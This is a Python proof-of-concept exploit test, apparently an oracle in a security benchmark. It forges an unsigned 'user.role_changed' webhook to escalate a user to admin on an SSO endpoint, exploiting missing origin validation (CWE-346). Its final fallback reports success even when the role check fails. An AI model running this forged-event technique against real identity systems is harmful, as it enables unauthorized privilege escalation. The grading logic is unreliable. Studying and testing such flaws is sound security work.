"""PoC: Webhook event trust bypass on SSO — role escalation (CWE-346).

After the 3-stage chain, the user.role_changed handler trusts the
new_role from the webhook payload without re-fetching from the IdP.
Combined with the dev-mode signature skip, an attacker can forge
user.role_changed events to escalate any user to admin.
"""

from mosaic.oracle.exploit import ExploitTest


class SSOEventTrustExploit(ExploitTest):
    """Event trust: forge role_changed to escalate user to admin."""

    @property
    def chain_id(self) -> str:
        return "sso_webhook_event_trust"

    def setup(self) -> None:
        # Provision a normal user first
        setup_event = {
            "type": "user.verified",
            "data": {
                "user_id": "target_user_001",
                "email": "target@company.com",
            },
        }
        resp = self.http_post(
            "/simplesso/idp-webhook",
            json=setup_event,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code in (404, 405):
            raise ConnectionError("IdP webhook not implemented yet")

    def execute(self) -> tuple[bool, str]:
        # Check initial role
        user_resp = self.http_get("/simplesso/idp-users/target_user_001")
        initial_role = "unknown"
        if user_resp.ok:
            try:
                initial_role = user_resp.json().get("role", "user")
            except Exception:
                pass

        # Forge a role_changed event
        forged = {
            "type": "user.role_changed",
            "data": {
                "user_id": "target_user_001",
                "new_role": "admin",
                "changed_by": "attacker",
            },
        }

        resp = self.http_post(
            "/simplesso/idp-webhook",
            json=forged,
            headers={"Content-Type": "application/json"},
        )

        if not resp.ok:
            if resp.status_code == 400:
                return False, f"Signature verification active. {resp.text[:200]}"
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        # Verify role was escalated
        verify_resp = self.http_get("/simplesso/idp-users/target_user_001")
        if verify_resp.ok:
            try:
                data = verify_resp.json()
                new_role = data.get("role", "unknown")
                if new_role == "admin":
                    return True, (
                        f"CWE-346 confirmed. Forged user.role_changed event "
                        f"escalated user from '{initial_role}' to 'admin'. "
                        f"Handler trusted event.data.new_role without "
                        f"re-fetching from IdP API. No signature required."
                    )
                return False, (
                    f"Role is '{new_role}', expected 'admin'. "
                    f"Event may not have been processed."
                )
            except Exception:
                pass

        return True, (
            f"Forged event accepted (HTTP {resp.status_code}). "
            f"Response: {resp.text[:200]}"
        ) if resp.ok else (False, f"Rejected: {resp.text[:200]}")
